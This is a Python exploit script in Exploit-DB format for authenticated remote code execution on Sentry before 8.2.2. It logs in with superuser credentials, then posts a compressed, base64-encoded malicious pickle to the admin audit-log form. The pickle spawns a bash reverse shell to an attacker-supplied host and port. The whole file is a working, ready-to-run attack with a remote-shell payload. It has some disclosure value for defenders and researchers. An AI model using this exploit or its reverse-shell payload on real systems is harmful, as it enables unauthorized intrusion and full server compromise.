# Exploit Title: Sentry 8.2.0 - Remote Code Execution (RCE) (Authenticated)
# Date: 22/09/2021
# Exploit Author: Mohin Paramasivam (Shad0wQu35t)
# Vulnerability Discovered By : Clement Berthaux (SYNACKTIV)
# Software Link: https://sentry.io/welcome/
# Advisory: https://doc.lagout.org/Others/synacktiv_advisory_sentry_pickle.pdf
# Tested on: Sentry 8.0.0
# Fixed Versions : 8.1.4 , 8.2.2
# NOTE : Only exploitable by a user with Superuser privileges.
# Example Usage : https://imgur.com/a/4w5rH5s

import requests
import re
import warnings
from bs4 import BeautifulSoup
import sys
import base64
import urllib
import argparse
import os
import time
from cPickle import dumps
import subprocess
from base64 import b64encode
from zlib import compress
from shlex import split
from datetime import datetime



parser = argparse.ArgumentParser(description='Sentry < 8.2.2 Authenticated RCE')
parser.add_argument('-U',help='Sentry Admin Username / Email')
parser.add_argument('-P',help='Sentry Admin Password')
parser.add_argument('-l',help='Rev Shell LHOST')
parser.add_argument('-p',help='Rev Shell LPORT ',type=int)
parser.add_argument('--url',help='Sentry Login URL ')
args = parser.parse_args()


username = args.U
password = args.P
lhost = args.l
lport = args.p
sentry_url = args.url



# Generate Payload


class PickleExploit(object):
	def __init__(self, command_line):
		self.args = split(command_line)
	def __reduce__(self):
		return (subprocess.Popen, (self.args,))
rev_shell = '/bin/bash -c "bash -i >& /dev/tcp/%s/%s 0>&1"' %(lhost,lport)
payload = b64encode(compress(dumps(PickleExploit(rev_shell))))

print("\r\n[+] Using Bash Reverse Shell : %s" %(rev_shell))
print("[+] Encoded Payload : %s" %(payload))




# Perform Exploitation

warnings.filterwarnings("ignore", category=UserWarning, module='bs4')
request = requests.Session()
print("[+] Retrieving CSRF token to submit the login form")
print("[+] URL : %s" %(sentry_url))
time.sleep(1)
page = request.get(sentry_url)
html_content = page.text
soup = BeautifulSoup(html_content,features="lxml")
token = soup.findAll('input')[0].get("value")


print("[+] CSRF Token : "+token)
time.sleep(1)

#Login

proxies = {
	"http" : "http://127.0.0.1:8080",
	"https" : "https://127.0.0.1:8080",
}

login_info ={
            "csrfmiddlewaretoken": token,
            "op": "login",
            "username": username,
            "password": password
}


login_request = request.post(sentry_url,login_info)


if login_request.status_code==200:
	print("[+] Login Successful")
	time.sleep(1)

else:

	print("Login Failed")
	print(" ")
	sys.exit()


#get admin page
split_url = sentry_url.split("/")[2:]
main_url = "http://"+split_url[0]
audit_url = main_url+"/admin/sentry/auditlogentry/add/"

#request auditpage


date = datetime.today().strftime('%Y-%m-%d')
time = datetime.today().strftime('%H:%M:%S')


exploit_fields = {

		"csrfmiddlewaretoken" : request.cookies['csrf'],
		"organization" : "1",
		"actor_label" : "root@localhost",
		"actor" : "1",
		"actor_key" : " ",
		"target_object" : "2",
		"target_user" : " ",
		"event" : "31",
		"ip_address" : "127.0.0.1",
		"data" : payload,
		"datetime_0" : date,
		"datetime_1" : time,
		"initial-datetime_0" : date,
		"initial-datetime_1" : time,
		"_save" : "Save"
}

print("[+] W00t W00t Sending Shell :) !!!")
stager = request.post(audit_url,exploit_fields)

if stager.status_code==200:
	print("[+] Check nc listener!")
else:
	print("Something Went Wrong or Not Vulnerable :(")